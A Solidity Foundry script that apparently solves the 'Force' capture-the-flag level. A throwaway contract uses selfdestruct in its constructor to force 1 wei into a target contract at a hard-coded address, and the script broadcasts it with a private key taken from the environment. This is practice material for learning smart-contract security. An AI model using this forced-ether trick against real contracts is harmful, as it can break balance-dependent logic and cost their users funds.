// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import {Force} from "../../src/Force/Force.sol";
import {Script} from "../../lib/forge-std/src/Script.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {

     // Force public forceInstance = Force(0x690c7A8D292f853728DbeB8eFD1C3FDd9f4C063f);
   
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x690c7A8D292f853728DbeB8eFD1C3FDd9f4C063f));
        vm.stopBroadcast();
    }
}